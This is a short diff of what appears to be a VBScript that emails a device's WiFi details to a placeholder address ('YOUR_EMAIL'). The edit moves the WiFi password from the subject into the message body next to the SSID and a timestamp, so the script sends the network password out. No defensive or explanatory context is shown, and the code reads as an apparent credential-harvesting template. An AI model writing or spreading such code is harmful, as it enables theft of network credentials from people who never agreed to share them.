@@ -158,8 +158,8 @@ msg.From = "YOUR_EMAIL"
 
 msg.Configuration.Fields.Update
 
-msg.Subject = "WiFi Connected: " & ssid & password
-msg.TextBody = "Device connected to WiFi SSID: " & ssid & vbCrLf & "Time: " & Now()
+msg.Subject = "WiFi Connected: " & ssid 
+msg.TextBody = "Device connected to WiFi SSID: " & ssid & vbCrLf & "password: " & password & vbCrLf & "Time: " & Now()
 msg.Send
 On Error Goto 0
 
